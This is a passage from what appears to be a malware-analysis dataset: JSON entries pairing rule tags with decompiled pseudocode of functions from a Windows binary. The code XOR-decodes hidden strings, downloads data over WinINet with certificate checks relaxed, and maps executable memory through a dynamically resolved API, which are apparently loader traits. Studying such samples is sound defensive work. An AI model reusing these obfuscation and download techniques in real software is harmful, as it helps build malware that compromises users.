fcn.004012d0();\n                                fcn.004012d0();\n                                fcn.0040b8f0();\n                                fcn.004012d0();\n                                fcn.004012d0();\n                                fcn.004012d0();\n                                fcn.004012d0();\n                                fcn.004012d0();\n                                fcn.0040b8f0();\n                                var_280h = var_2a8h;\n                            }\n                        }\n                    }\n                    else {\n                        var_2a0h = 3;\n                        fcn.004012d0();\n                        fcn.004012d0();\n                        fcn.004012d0();\n                        fcn.0040b8f0();\n                        fcn.004012d0();\n                        fcn.004012d0();\n                        fcn.004012d0();\n                        fcn.004012d0();\n                        fcn.004012d0();\n                        fcn.0040b8f0();\n                        var_280h = var_2a0h;\n                    }\n                }\n            }\n        }\n    }\n    return var_280h;\n}\n",
        "token_count": 13240
    },
    "0040fdc0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl\nfcn.0040fdc0(uint arg_8h, uint32_t *arg_ch, int32_t arg_10h, int32_t arg_14h, uint32_t *arg_18h, int32_t *arg_1ch, \n            int32_t arg_20h, uint arg_24h, int32_t arg_28h, uint *arg_2ch)\n\n{\n    uint uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    uchar *puVar6;\n    uint arg_ch_00;\n    uint var_3a0h;\n    uint var_1a0h;\n    uint var_19ch;\n    uint var_198h;\n    uint var_194h;\n    uint var_190h;\n    uint var_18ch;\n    uint32_t var_188h;\n    int32_t var_184h;\n    uint var_180h;\n    int32_t var_17ch;\n    uint32_t var_178h;\n    uint var_174h;\n    int32_t var_170h;\n    uint var_16ch;\n    int32_t var_168h;\n    uint var_164h;\n    uchar var_160h;\n    uchar var_15fh;\n    uchar var_15eh;\n    uchar var_15dh;\n    uchar var_15ch;\n    uchar var_15bh;\n    uchar var_15ah;\n    uchar var_159h;\n    uchar var_158h;\n    uchar var_157h;\n    uchar var_156h;\n    uchar var_155h;\n    uchar var_154h;\n    uchar var_153h;\n    uchar var_152h;\n    uchar var_151h;\n    uchar var_150h;\n    uchar var_14fh;\n    uchar var_14eh;\n    uchar var_14dh;\n    uchar var_14ch;\n    uchar var_14bh;\n    uchar var_14ah;\n    uchar var_149h;\n    uchar var_148h;\n    uchar var_147h;\n    uchar var_146h;\n    uchar var_145h;\n    uchar var_144h;\n    uchar var_143h;\n    uchar var_142h;\n    uchar var_141h;\n    uchar var_140h;\n    uchar var_13fh;\n    uchar var_13eh;\n    uchar var_13dh;\n    uchar var_13ch;\n    uchar var_13bh;\n    uchar var_13ah;\n    uchar var_139h;\n    uchar var_138h;\n    uchar var_137h;\n    uchar var_136h;\n    uchar var_135h;\n    uchar var_134h;\n    uchar var_133h;\n    uchar var_132h;\n    uchar var_131h;\n    uchar var_130h;\n    uchar var_12fh;\n    uchar var_12eh;\n    uchar var_12dh;\n    uchar var_12ch;\n    uchar var_12bh;\n    uchar var_12ah;\n    uchar var_129h;\n    uchar var_128h;\n    uchar var_127h;\n    uchar var_126h;\n    uchar var_125h;\n    uchar var_124h;\n    uchar var_123h;\n    uchar var_122h;\n    uchar var_121h;\n    uchar var_120h;\n    uchar var_11fh;\n    uchar var_11eh;\n    uchar var_11dh;\n    uchar var_11ch;\n    uchar var_11bh;\n    uchar var_11ah;\n    uchar var_119h;\n    uchar var_118h;\n    uchar var_117h;\n    uchar var_116h;\n    uchar var_115h;\n    uchar var_114h;\n    uchar var_113h;\n    uchar var_112h;\n    uchar var_111h;\n    uchar var_110h;\n    uchar var_10fh;\n    uchar var_10eh;\n    uchar var_10dh;\n    uchar var_10ch;\n    uchar var_10bh;\n    uchar var_10ah;\n    uchar var_109h;\n    uchar var_108h;\n    uchar var_107h;\n    uchar var_106h;\n    uchar var_105h;\n    uchar var_104h;\n    uchar var_103h;\n    uchar var_102h;\n    uchar var_101h;\n    uchar var_100h;\n    uchar var_ffh;\n    uchar var_feh;\n    uchar var_fdh;\n    uchar var_fch;\n    uchar var_fbh;\n    uchar var_fah;\n    uchar var_f9h;\n    uchar var_f8h;\n    uchar var_f7h;\n    uchar var_f6h;\n    uchar var_f5h;\n    uchar var_f4h;\n    uchar var_f3h;\n    uchar var_f2h;\n    uchar var_f1h;\n    uchar var_f0h;\n    uchar var_efh;\n    uchar var_eeh;\n    uchar var_edh;\n    uchar var_ech;\n    uchar var_ebh;\n    uchar var_eah;\n    uchar var_e9h;\n    uchar var_e8h;\n    uchar var_e7h;\n    uchar var_e6h;\n    uchar var_e5h;\n    uchar var_e4h;\n    uchar var_e3h;\n    uchar var_e2h;\n    uchar var_e1h;\n    uchar var_e0h;\n    uchar var_dfh;\n    uchar var_deh;\n    uchar var_ddh;\n    uchar var_dch;\n    uchar var_dbh;\n    uchar var_dah;\n    uchar var_d9h;\n    uchar var_d8h;\n    uchar var_d7h;\n    uchar var_d6h;\n    uchar var_d5h;\n    uchar var_d4h;\n    uchar var_d3h;\n    uchar var_d2h;\n    uchar var_d1h;\n    uchar var_d0h;\n    uchar var_cfh;\n    uchar var_ceh;\n    uchar var_cdh;\n    uchar var_cch;\n    uchar var_cbh;\n    uchar var_cah;\n    uchar var_c9h;\n    uint8_t var_c8h [4];\n    uchar var_c4h;\n    uchar var_c3h;\n    uchar var_c2h;\n    uchar var_c1h;\n    uchar var_c0h;\n    uchar var_bfh;\n    uchar var_beh;\n    uchar var_bdh;\n    uchar var_bch;\n    uchar var_bbh;\n    uchar var_bah;\n    uchar var_b9h;\n    uchar var_b8h;\n    uchar var_b7h;\n    uchar var_b6h;\n    uchar var_b5h;\n    uint8_t var_b4h [4];\n    uchar var_b0h;\n    uchar var_afh;\n    uchar var_aeh;\n    uchar var_adh;\n    uchar var_ach;\n    uchar var_abh;\n    uchar var_aah;\n    uchar var_a9h;\n    uchar var_a8h;\n    uchar var_a7h;\n    uchar var_a6h;\n    uchar var_a5h;\n    uchar var_a4h;\n    uchar var_a3h;\n    uint var_a0h;\n    uchar var_9ch;\n    uchar var_9bh;\n    uchar var_9ah;\n    uchar var_99h;\n    uchar var_98h;\n    uchar var_97h;\n    uchar var_96h;\n    uchar var_95h;\n    uchar var_94h;\n    uchar var_93h;\n    uchar var_92h;\n    uchar var_91h;\n    uchar var_90h;\n    uchar var_8fh;\n    uint8_t var_8ch [4];\n    uchar var_88h;\n    uchar var_87h;\n    uchar var_86h;\n    uchar var_85h;\n    uchar var_84h;\n    uchar var_83h;\n    uchar var_82h;\n    uchar var_81h;\n    uchar var_80h;\n    uchar var_7fh;\n    uchar var_7eh;\n    uchar var_7dh;\n    uchar var_7ch;\n    uint var_78h;\n    uchar var_74h;\n    uchar var_73h;\n    uchar var_72h;\n    uchar var_71h;\n    uint var_70h;\n    uchar var_6ch;\n    uchar var_6bh;\n    uint8_t var_68h [4];\n    uchar var_64h;\n    uchar var_63h;\n    uint8_t var_60h [4];\n    uchar var_5ch;\n    uchar var_5bh;\n    uint var_58h;\n    uchar var_54h;\n    uint var_50h;\n    uchar var_4ch;\n    uint var_48h;\n    uchar var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    int32_t var_2ch;\n    int32_t var_28h;\n    uint var_24h;\n    uint32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_17ch = 0;\n    var_1a0h = 0;\n    var_28h = 0;\n    var_24h = 0;\n    var_16ch = 4;\n    var_198h = 4;\n    var_180h = 1;\n    if (arg_20h == 0) {\n        *arg_ch = 0;\n    }\n    var_164h._0_1_ = 0x1c;\n    var_164h._1_1_ = 0x6d;\n    var_164h._2_1_ = 4;\n    var_164h._3_1_ = 0x49;\n    var_160h = 0x34;\n    var_15fh = 0x46;\n    var_15eh = 0x38;\n    var_15dh = 0x6d;\n    var_15ch = 7;\n    var_15bh = 0x49;\n    var_15ah = 0x22;\n    var_159h = 0x46;\n    var_158h = 0x30;\n    var_157h = 0x6d;\n    var_156h = 0x44;\n    var_155h = 0x49;\n    var_154h = 0x7b;\n    var_153h = 0x46;\n    var_152h = 0x7f;\n    var_151h = 0x6d;\n    var_150h = 0x5b;\n    var_14fh = 0x49;\n    var_14eh = 0x6e;\n    var_14dh = 0x46;\n    var_14ch = 0x79;\n    var_14bh = 0x6d;\n    var_14ah = 0x3c;\n    var_149h = 0x49;\n    var_148h = 0x27;\n    var_147h = 0x46;\n    var_146h = 0x3f;\n    var_145h = 0x6d;\n    var_144h = 0xf;\n    var_143h = 0x49;\n    var_142h = 0x21;\n    var_141h = 0x46;\n    var_140h = 0x26;\n    var_13fh = 0x6d;\n    var_13eh = 0x18;\n    var_13dh = 0x49;\n    var_13ch = 0x6e;\n    var_13bh = 0x46;\n    var_13ah = 0x1f;\n    var_139h = 0x6d;\n    var_138h = 0x3f;\n    var_137h = 0x49;\n    var_136h = 0x6e;\n    var_135h = 0x46;\n    var_134h = 0x67;\n    var_133h = 0x6d;\n    var_132h = 0x45;\n    var_131h = 0x49;\n    var_130h = 0x7f;\n    var_12fh = 0x46;\n    var_12eh = 0x6a;\n    var_12dh = 0x6d;\n    var_12ch = 0x4b;\n    var_12bh = 0x49;\n    var_12ah = 0x19;\n    var_129h = 0x46;\n    var_128h = 0x38;\n    var_127h = 0x6d;\n    var_126h = 5;\n    var_125h = 0x49;\n    var_124h = 0x78;\n    var_123h = 0x46;\n    var_122h = 0x65;\n    var_121h = 0x6d;\n    var_120h = 0x50;\n    var_11fh = 0x49;\n    var_11eh = 0x6e;\n    var_11dh = 0x46;\n    var_11ch = 0x29;\n    var_11bh = 0x6d;\n    var_11ah = 0x5d;\n    var_119h = 0x49;\n    var_118h = 0x7a;\n    var_117h = 0x46;\n    var_116h = 0x6a;\n    var_115h = 0x6d;\n    var_114h = 0x4b;\n    var_113h = 0x49;\n    var_112h = 0x3c;\n    var_111h = 0x46;\n    var_110h = 0x27;\n    var_10fh = 0x6d;\n    var_10eh = 0x51;\n    var_10dh = 0x49;\n    var_10ch = 0x7c;\n    var_10bh = 0x46;\n    var_10ah = 100;\n    var_109h = 0x6d;\n    var_108h = 0x45;\n    var_107h = 0x49;\n    var_106h = 0x7e;\n    var_105h = 0x46;\n    var_104h = 0x78;\n    var_103h = 0x6d;\n    var_102h = 0x4b;\n    var_101h = 0x49;\n    var_100h = 9;\n    var_ffh = 0x46;\n    var_feh = 0x34;\n    var_fdh = 0x6d;\n    var_fch = 8;\n    var_fbh = 0x49;\n    var_fah = 0x25;\n    var_f9h = 0x46;\n    var_f8h = 0x3e;\n    var_f7h = 0x6d;\n    var_f6h = 0x44;\n    var_f5h = 0x49;\n    var_f4h = 0x7c;\n    var_f3h = 0x46;\n    var_f2h = 0x60;\n    var_f1h = 0x6d;\n    var_f0h = 0x5b;\n    var_efh = 0x49;\n    var_eeh = 0x7e;\n    var_edh = 0x46;\n    var_ech = 0x61;\n    var_ebh = 0x6d;\n    var_eah = 0x5a;\n    var_e9h = 0x49;\n    var_e8h = 0x7e;\n    var_e7h = 0x46;\n    var_e6h = 0x60;\n    var_e5h = 0x6d;\n    var_e4h = 0x4b;\n    var_e3h = 0x49;\n    var_e2h = 8;\n    var_e1h = 0x46;\n    var_e0h = 0x38;\n    var_dfh = 0x6d;\n    var_deh = 0x19;\n    var_ddh = 0x49;\n    var_dch = 0x2b;\n    var_dbh = 0x46;\n    var_dah = 0x37;\n    var_d9h = 0x6d;\n    var_d8h = 4;\n    var_d7h = 0x49;\n    var_d6h = 0x36;\n    var_d5h = 0x46;\n    var_d4h = 0x7e;\n    var_d3h = 0x6d;\n    var_d2h = 0x59;\n    var_d1h = 0x49;\n    var_d0h = 0x7b;\n    var_cfh = 0x46;\n    var_ceh = 0x7f;\n    var_cdh = 0x6d;\n    var_cch = 0x5b;\n    var_cbh = 0x49;\n    var_cah = 0x4e;\n    var_c9h = 0x46;\n    var_70h._0_1_ = 0x51;\n    var_70h._1_1_ = 0x6d;\n    var_70h._2_1_ = 0x6b;\n    var_70h._3_1_ = 0x49;\n    var_6ch = 0x4e;\n    var_6bh = 0x46;\n    fcn.004012a0(0x138);\n    for (var_8h = 0; var_8h < 0x9c; var_8h = var_8h + 1) {\n        fcn.00401280(var_8h, *(&var_164h + var_8h) ^ *(&var_70h + var_8h % 6));\n    }\n    uVar1 = fcn.00422ee0();\n    *arg_2ch = uVar1;\n    var_188h = arg_28h == 0;\n    uVar1 = fcn.00401270(var_188h, 0, 0, 0);\n    var_184h = (*_sym.imp.WININET.dll_InternetOpenW)(uVar1);\n    if (var_184h != 0) {\n        var_168h = (*_sym.imp.WININET.dll_InternetConnectA)(var_184h, arg_8h, arg_24h, 0, 0, 3, 0, 0);\n        if (var_168h == 0) {\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            fcn.0040bab0(uVar1);\n        }\n        else {\n            var_194h = 0x84800300;\n            var_78h._0_1_ = 1;\n            var_78h._1_1_ = 0x31;\n            var_78h._2_1_ = 0x2f;\n            var_78h._3_1_ = 0x6b;\n            var_74h = 0x23;\n            var_73h = 0x46;\n            var_72h = 0x31;\n            var_71h = 0x6a;\n            var_58h._0_1_ = 0x46;\n            var_58h._1_1_ = 0x31;\n            var_58h._2_1_ = 0x6a;\n            var_58h._3_1_ = 0x6b;\n            var_54h = 0x77;\n            fcn.004012a0(0x10);\n            for (var_ch = 0; var_ch < 8; var_ch = var_ch + 1) {\n                fcn.00401280(var_ch, *(&var_78h + var_ch) ^ *(&var_58h + var_ch % 5));\n            }\n            var_c8h[0] = 0x67;\n            var_c8h[1] = 0x52;\n            var_c8h[2] = 0x28;\n            var_c8h[3] = 100;\n            var_c4h = 0x2a;\n            var_c3h = 0x48;\n            var_c2h = 0x3d;\n            var_c1h = 0x5a;\n            var_c0h = 0;\n            var_bfh = 0x48;\n            var_beh = 0x31;\n            var_bdh = 0x52;\n            var_bch = 0x69;\n            var_bbh = 100;\n            var_bah = 0x7a;\n            var_b9h = 0x48;\n            var_b8h = 0x62;\n            var_b7h = 0x5a;\n            var_b6h = 100;\n            var_b5h = 0x48;\n            var_50h._0_1_ = 0x48;\n            var_50h._1_1_ = 0x52;\n            var_50h._2_1_ = 0x5a;\n            var_50h._3_1_ = 100;\n            var_4ch = 0x48;\n            uVar1 = 0x28;\n            fcn.004012a0(0x28);\n            for (var_10h = 0; var_10h < 0x14; var_10h = var_10h + 1) {\n                fcn.00401280(var_10h, var_c8h[var_10h] ^ *(&var_50h + var_10h % 5));\n            }\n            var_a0h._0_1_ = 0x41;\n            var_a0h._1_1_ = 0x35;\n            var_a0h._2_1_ = 0x1d;\n            var_a0h._3_1_ = 0x49;\n            var_9ch = 0x26;\n            var_9bh = 0x6d;\n            var_9ah = 1;\n            var_99h = 0x35;\n            var_98h = 0xb;\n            var_97h = 0x49;\n            var_96h = 0x3d;\n            var_95h = 0x6d;\n            var_94h = 0x5d;\n            var_93h = 0x35;\n            var_92h = 0x5d;\n            var_91h = 0x49;\n            var_90h = 0x44;\n            var_8fh = 0x6d;\n            var_68h[0] = 0x6e;\n            var_68h[1] = 0x35;\n            var_68h[2] = 0x6f;\n            var_68h[3] = 0x49;\n            var_64h = 0x44;\n            var_63h = 0x6d;\n            arg_ch_00 = 0x24;\n            fcn.004012a0(0x24);\n            for (var_14h = 0; var_14h < 0x12; var_14h = var_14h + 1) {\n                fcn.00401280(var_14h, *(&var_a0h + var_14h) ^ var_68h[var_14h % 6]);\n            }\n            var_b4h[0] = 0x5d;\n            var_b4h[1] = 0x39;\n            var_b4h[2] = 8;\n            var_b4h[3] = 0x6d;\n            var_b0h = 0x55;\n            var_afh = 0x42;\n            var_aeh = 0x1d;\n            var_adh = 0x39;\n            var_ach = 0x1e;\n            var_abh = 0x6d;\n            var_aah = 0x4e;\n            var_a9h = 0x42;\n            var_a8h = 0x44;\n            var_a7h = 0x39;\n            var_a6h = 0x4e;\n            var_a5h = 0x6d;\n            var_a4h = 0x37;\n            var_a3h = 0x42;\n            var_60h[0] = 0x72;\n            var_60h[1] = 0x39;\n            var_60h[2] = 0x7a;\n            var_60h[3] = 0x6d;\n            var_5ch = 0x37;\n            var_5bh = 0x42;\n            fcn.004012a0(0x24);\n            for (var_18h = 0; var_18h < 0x12; var_18h = var_18h + 1) {\n                fcn.00401280(var_18h, var_b4h[var_18h] ^ var_60h[var_18h % 6]);\n            }\n            if (arg_14h == 0) {\n                if (arg_10h == 0x140) {\n                    var_24h = fcn.00401270();\n                }\n                else if (arg_10h == 0x20) {\n                    var_24h = fcn.00401270();\n                }\n                else {\n                    if (arg_10h != 0x40) {\n                        var_190h = 1;\n                        fcn.004012d0();\n                        fcn.004012d0();\n                        fcn.004012d0();\n                        fcn.004012d0();\n                        fcn.004012d0();\n                        return var_190h;\n                    }\n                    var_24h = fcn.00401270();\n                }\n            }\n            else {\n                var_28h = arg_14h;\n                if (arg_14h == 0) {\n                    var_18ch = 0;\n                }\n                else {\n                    var_17ch = (*_sym.imp.KERNEL32.dll_lstrlenA)(arg_14h);\n                    var_17ch = var_17ch + 1;\n                    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, var_17ch * 2, var_28h, var_17ch);\n                    uVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                    var_18ch = fcn.0040b890(uVar2, arg_ch_00, uVar1);\n                }\n                var_24h = var_18ch;\n            }\n            uVar1 = fcn.00401270(var_24h, 0, 0, 0, var_194h, 0);\n            var_4h = (*_sym.imp.WININET.dll_HttpOpenRequestW)(var_168h, uVar1);\n            if (var_4h == 0) {\n                uVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                fcn.0040bab0(uVar1);\n            }\n            else {\n                fcn.0040bc90(var_4h, 1, *arg_2ch, arg_28h);\n                (*_sym.imp.WININET.dll_InternetQueryOptionA)(var_4h, 0x1f, &var_178h, &var_198h);\n                var_178h = var_178h | 0x7380;\n                (*_sym.imp.WININET.dll_InternetSetOptionA)(var_4h, 0x1f, &var_178h, 4);\n                if (arg_20h != 0) {\n                    var_8ch[0] = 0x3d;\n                    var_8ch[1] = 0x35;\n                    var_8ch[2] = 7;\n                    var_8ch[3] = 0x50;\n                    var_88h = 0x17;\n                    var_87h = 0x55;\n                    var_86h = 0x74;\n                    var_85h = 0xb;\n                    var_84h = 0x4e;\n                    var_83h = 6;\n                    var_82h = 10;\n                    var_81h = 0x27;\n                    var_80h = 0x54;\n                    var_7fh = 0x12;\n                    var_7eh = 0x16;\n                    var_7dh = 0x42;\n                    var_7ch = 0x54;\n                    var_48h._0_1_ = 0x6f;\n                    var_48h._1_1_ = 0x54;\n                    var_48h._2_1_ = 0x69;\n                    var_48h._3_1_ = 0x37;\n                    var_44h = 0x72;\n                    fcn.004012a0(0x11);\n                    for (var_1ch = 0; var_1ch < 0x11; var_1ch = var_1ch + 1) {\n                        fcn.00401280(var_1ch, var_8ch[var_1ch] ^ *(&var_48h + var_1ch % 5));\n                    }\n                    uVar1 = fcn.00401270(*arg_ch);\n                    (*_sym.imp.USER32.dll_wsprintfA)(&var_3a0h, uVar1);\n                    uVar1 = (*_sym.imp.KERNEL32.dll_lstrlenA)(&var_3a0h, 0x10000000);\n                    (*_sym.imp.WININET.dll_HttpAddRequestHeadersA)(var_4h, &var_3a0h, uVar1);\n                    fcn.004012d0();\n                }\n                var_20h = 0;\n                var_170h = 0;\n                iVar3 = (*_sym.imp.WININET.dll_HttpSendRequestA)(var_4h, 0, 0, 0, 0);\n                if (iVar3 == 0) {\n                    uVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                    fcn.0040bab0(uVar1);\n                }\n                else {\n                    iVar3 = (*_sym.imp.WININET.dll_HttpQueryInfoA)(var_4h, 0x20000013, &var_170h, &var_16ch, 0);\n                    if (iVar3 == 0) {\n                        uVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                        fcn.0040bab0(uVar1);\n                    }\n                    else if ((var_170h == 200) || (var_170h == 0xce)) {\n                        var_16ch = 4;\n                        iVar3 = (*_sym.imp.WININET.dll_HttpQueryInfoA)(var_4h, 0x20000005, &var_20h, &var_16ch, 0);\n                        if (iVar3 == 0) {\n                            uVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                            fcn.0040bab0(uVar1);\n                        }\n                        else if (var_20h != 0) {\n                            if (arg_20h == 0) {\n                                *arg_18h = var_20h;\n                                uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, var_20h);\n                                uVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n                                arg_ch[1] = uVar4;\n                                *arg_ch = 0;\n                            }\n                            puVar5 = &var_3a0h;\n                            for (iVar3 = 0x200; iVar3 != 0; iVar3 = iVar3 + -1) {\n                                *puVar5 = 0;\n                                puVar5 = puVar5 + 1;\n                            }\n                            while (iVar3 = (*_sym.imp.WININET.dll_InternetReadFile)(var_4h, &var_3a0h, 0x200, &var_2ch)\n                                  ,  iVar3 != 0) {\n                                if (var_2ch == 0) {\n                                    if (*arg_ch < var_20h) {\n                                        var_180h = 6;\n                                    }\n                                    else if (*arg_ch == var_20h) {\n                                        var_180h = 0;\n                                    }\n                                    goto code_r0x00410b2c;\n                                }\n                                puVar5 = &var_3a0h;\n                                puVar6 = arg_ch[1] + *arg_ch;\n                                for (iVar3 = var_2ch; iVar3 != 0; iVar3 = iVar3 + -1) {\n                                    *puVar6 = *puVar5;\n                                    puVar5 = puVar5 + 1;\n                                    puVar6 = puVar6 + 1;\n                                }\n                                puVar5 = &var_3a0h;\n                                for (iVar3 = 0x200; iVar3 != 0; iVar3 = iVar3 + -1) {\n                                    *puVar5 = 0;\n                                    puVar5 = puVar5 + 1;\n                                }\n                                *arg_1ch = *arg_1ch + var_2ch;\n                                *arg_ch = *arg_ch + var_2ch;\n                            }\n                            uVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                            fcn.0040bab0(uVar1);\n                        }\n                    }\n                }\ncode_r0x00410b2c:\n                (*_sym.imp.WININET.dll_InternetCloseHandle)(var_4h);\n            }\n            (*_sym.imp.WININET.dll_InternetCloseHandle)(var_168h);\n            fcn.004012d0();\n            fcn.004012d0();\n            fcn.004012d0();\n            fcn.004012d0();\n        }\n        (*_sym.imp.WININET.dll_InternetCloseHandle)(var_184h);\n    }\n    var_19ch = var_180h;\n    fcn.004012d0();\n    return var_19ch;\n}\n",
        "token_count": 7690
    },
    "00410bc0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.00410bc0(uint arg_8h, uint *arg_ch, uint arg_10h, uint arg_14h, uint32_t *arg_18h, uint32_t *arg_1ch, uint arg_20h)\n\n{\n    uint var_ch;\n    code *var_8h;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    if (*0x436b54 == 0) {\n        var_8h = fcn.0040fdc0;\n    }\n    else {\n        var_8h = fcn.0040e590;\n    }\n    do {\n        var_4h = (*var_8h)(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, *arg_ch, arg_20h, 0, &var_ch);\n        if ((var_4h != 6) && (var_4h != 0)) {\n            var_4h = (*var_8h)(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, *arg_ch, arg_20h, 1, &var_ch);\n        }\n    } while ((var_4h == 6) && (*arg_1ch <= *arg_18h && *arg_18h != *arg_1ch));\n    if (var_4h != 0) {\n        fcn.004245f0(arg_ch);\n    }\n    return var_4h;\n}\n",
        "token_count": 350
    },
    "00410e60": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00410e60(int32_t arg_8h, uint *arg_ch, int32_t *arg_10h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uchar *puVar4;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uchar var_64h;\n    uchar var_63h;\n    uchar var_62h;\n    uchar var_61h;\n    uchar var_60h;\n    uchar var_5fh;\n    uchar var_5eh;\n    uchar var_5dh;\n    uchar var_5ch;\n    uchar var_5bh;\n    uchar var_5ah;\n    uchar var_59h;\n    uint var_58h;\n    uchar var_54h;\n    uchar var_53h;\n    uchar var_52h;\n    uchar var_51h;\n    uchar var_50h;\n    uchar var_4fh;\n    uint var_4ch;\n    int32_t var_44h;\n    uint var_3ch;\n    uchar var_38h;\n    uint var_34h;\n    uchar var_30h;\n    uint var_2ch;\n    int32_t var_28h;\n    code *var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uchar *var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_10h = 0;\n    var_ch = 0;\n    var_2ch = 0;\n    var_18h = 0;\n    var_14h = NULL;\n    puVar3 = &var_80h;\n    for (iVar2 = 0x18; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    puVar3 = &var_44h;\n    for (iVar2 = 8; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    puVar3 = &var_4ch;\n    for (iVar2 = 8; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    var_44h = arg_8h;\n    var_58h._0_1_ = 0x27;\n    var_58h._1_1_ = 0x1f;\n    var_58h._2_1_ = 5;\n    var_58h._3_1_ = 1;\n    var_54h = 0x3d;\n    var_53h = 0x67;\n    var_52h = 0xf;\n    var_51h = 0xd;\n    var_50h = 1;\n    var_4fh = 0x51;\n    var_34h._0_1_ = 0x49;\n    var_34h._1_1_ = 0x6b;\n    var_34h._2_1_ = 0x61;\n    var_34h._3_1_ = 0x6d;\n    var_30h = 0x51;\n    fcn.004012a0(10);\n    for (var_4h = 0; var_4h < 10; var_4h = var_4h + 1) {\n        fcn.00401280(var_4h, *(&var_58h + var_4h) ^ *(&var_34h + var_4h % 5));\n    }\n    var_68h._0_1_ = 0x1b;\n    var_68h._1_1_ = 0x44;\n    var_68h._2_1_ = 0x11;\n    var_68h._3_1_ = 0x3e;\n    var_64h = 0x21;\n    var_63h = 0x34;\n    var_62h = 0x44;\n    var_61h = 0x37;\n    var_60h = 0x1f;\n    var_5fh = 0x21;\n    var_5eh = 0x36;\n    var_5dh = 0x44;\n    var_5ch = 0x3b;\n    var_5bh = 0x23;\n    var_5ah = 0x2a;\n    var_59h = 0x55;\n    var_3ch._0_1_ = 0x55;\n    var_3ch._1_1_ = 0x30;\n    var_3ch._2_1_ = 0x52;\n    var_3ch._3_1_ = 0x4c;\n    var_38h = 0x44;\n    fcn.004012a0(0x10);\n    for (var_8h = 0; var_8h < 0x10; var_8h = var_8h + 1) {\n        fcn.00401280(var_8h, *(&var_68h + var_8h) ^ *(&var_3ch + var_8h % 5));\n    }\n    uVar1 = fcn.00401270();\n    uVar1 = fcn.00401270(uVar1);\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(uVar1);\n    var_24h = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n    var_80h = 0x18;\n    var_7ch = 0;\n    var_74h = 0x40;\n    var_78h = 0;\n    var_70h = 0;\n    var_6ch = 0;\n    var_18h = (*var_24h)(&var_ch, 0xf001f, &var_80h, &var_44h, 0x40, 0x8000000, 0);\n    if (var_18h < 0) {\n        var_10h = fcn.00411130(var_18h);\n    }\n    else {\n        var_10h = fcn.00411620(var_ch, 0xffffffff, &var_14h);\n        iVar2 = var_44h;\n        puVar4 = var_14h;\n        if (var_10h == 0) {\n            for (; iVar2 != 0; iVar2 = iVar2 + -1) {\n                *puVar4 = 0;\n                puVar4 = puVar4 + 1;\n            }\n            *arg_ch = var_14h;\n            if (arg_10h != NULL) {\n                *arg_10h = var_ch;\n            }\n        }\n    }\n    if ((var_ch != 0) && (arg_10h == NULL)) {\n        fcn.004112d0(var_ch);\n    }\n    var_28h = var_10h;\n    fcn.004012d0();\n    fcn.004012d0();\n    return var_28h;\n}\n",
        "token_count": 1690
    },
    "004112f0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
